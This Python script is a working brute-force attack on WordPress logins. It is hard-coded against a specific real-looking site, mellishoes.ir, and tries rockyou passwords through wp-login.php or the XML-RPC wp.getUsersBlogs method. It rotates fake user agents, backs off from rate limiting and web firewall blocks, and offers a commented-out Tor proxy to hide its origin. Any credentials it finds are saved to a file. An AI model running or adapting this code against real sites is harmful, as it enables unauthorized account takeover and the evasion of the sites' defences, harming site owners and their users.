import requests
import sys
import threading
import time
import random
import logging
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from lxml import etree
from io import BytesIO
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bruteforce.log'),
        logging.StreamHandler()
    ]
)

# Global variables
SUCCESS_WP_LOGIN = 'Welcome to WordPress!'
SUCCESS_XMLRPC = '<methodResponse>'
TARGET = 'https://mellishoes.ir/wp-login.php'
USERNAME_WORDLIST = '/home/kalafe/bhp/Chapter5/wordpress.txt'
PASSWORD_WORDLIST = '/usr/share/wordlists/rockyou.txt'
THREADS = 3  # Reduced number of threads
DELAY_MIN = 1.0  # Increased minimum delay
DELAY_MAX = 3.0  # Increased maximum delay
USE_XMLRPC = False
PROXY = None
TIMEOUT = 30  # Increased timeout
MAX_RETRIES = 3  # Maximum number of retries

def create_session():
    """Create a session with retry mechanism"""
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def get_words(wordlist_path):
    """Read wordlist from file"""
    try:
        # Try with utf-8 first
        try:
            with open(wordlist_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            # If utf-8 fails, try with latin-1
            with open(wordlist_path, 'r', encoding='latin-1') as f:
                return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error(f"Wordlist file not found: {wordlist_path}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Error reading wordlist {wordlist_path}: {e}")
        sys.exit(1)

def get_params(content):
    """Extract login form parameters"""
    params = {}
    try:
        parser = etree.HTMLParser()
        tree = etree.parse(BytesIO(content), parser=parser)
        for elem in tree.findall('//input'):
            name = elem.get('name')
            if name:
                params[name] = elem.get('value', '')
        return params
    except Exception as e:
        logging.error(f"Error parsing form: {e}")
        return {'log': '', 'pwd': '', 'wp-submit': 'Log In', 'redirect_to': '', 'testcookie': '1'}

class Bruter:
    def __init__(self, url, use_xmlrpc=False, proxy=None):
        self.url = url
        self.use_xmlrpc = use_xmlrpc
        self.proxy = proxy
        self.found = threading.Event()
        self.ua = UserAgent()
        self.lock = threading.Lock()
        logging.info(f"Starting brute force attack on {url} {'(XML-RPC)' if use_xmlrpc else ''}")

    def run_bruteforce(self, usernames, passwords):
        """Run attack with thread pool"""
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            for username in usernames:
                if self.found.is_set():
                    break
                executor.submit(self.web_bruter, username, passwords)

    def web_bruter(self, username, passwords):
        """Brute force for a single username"""
        if self.found.is_set():
            return
        
        session = create_session()
        session.proxies = self.proxy
        session.headers.update({'User-Agent': self.ua.random})

        if not self.use_xmlrpc:
            try:
                resp0 = session.get(self.url, timeout=TIMEOUT)
                resp0.raise_for_status()
                params = get_params(resp0.content)
            except requests.RequestException as e:
                logging.error(f"Error accessing {self.url}: {e}")
                return
        else:
            params = {}

        for passwd in passwords:
            if self.found.is_set():
                break
            with self.lock:
                logging.info(f"Trying: {username}/{passwd}")

            # time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

            try:
                if self.use_xmlrpc:
                    xml = f"""<?xml version="1.0"?>
                    <methodCall>
                        <methodName>wp.getUsersBlogs</methodName>
                        <params>
                            <param><value>{username}</value></param>
                            <param><value>{passwd}</value></param>
                        </params>
                    </methodCall>"""
                    headers = {'User-Agent': self.ua.random, 'Content-Type': 'text/xml'}
                    resp1 = session.post(self.url, data=xml, headers=headers, timeout=TIMEOUT)
                else:
                    params['log'] = username
                    params['pwd'] = passwd
                    headers = {'User-Agent': self.ua.random}
                    resp1 = session.post(self.url, data=params, headers=headers, timeout=TIMEOUT)

                if (not self.use_xmlrpc and SUCCESS_WP_LOGIN in resp1.text) or \
                   (self.use_xmlrpc and SUCCESS_XMLRPC in resp1.text and 'faultCode' not in resp1.text):
                    with self.lock:
                        self.found.set()
                        result = f"Success! Username: {username}, Password: {passwd}"
                        logging.info(result)
                        with open('bruteforce_success.txt', 'a') as f:
                            f.write(result + '\n')
                        return
                elif resp1.status_code == 429:
                    logging.warning("429: Too many requests. Increasing delay...")
                    time.sleep(15)  # Increased delay for rate limiting
                elif resp1.status_code == 403:
                    logging.warning("403: Forbidden. WAF might be blocking.")
                    time.sleep(10)  # Increased delay for WAF

            except requests.RequestException as e:
                logging.error(f"Error in request {username}/{passwd}: {e}")
                time.sleep(10)  # Increased delay for errors

if __name__ == '__main__':
    try:
        session = create_session()
        xmlrpc_check = session.get('https://mellishoes.ir/xmlrpc.php', timeout=TIMEOUT)
        if xmlrpc_check.status_code == 200 and 'XML-RPC server' in xmlrpc_check.text:
            USE_XMLRPC = True
            TARGET = 'https://mellishoes.ir/xmlrpc.php'
            logging.info("XML-RPC is active. Switching to XML-RPC mode.")
    except requests.RequestException:
        logging.info("XML-RPC not available. Using wp-login.php.")

    usernames = get_words(USERNAME_WORDLIST)
    passwords = get_words(PASSWORD_WORDLIST)

    # Setup proxy (optional)
    # PROXY = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

    bruter = Bruter(TARGET, USE_XMLRPC, PROXY)
    bruter.run_bruteforce(usernames, passwords)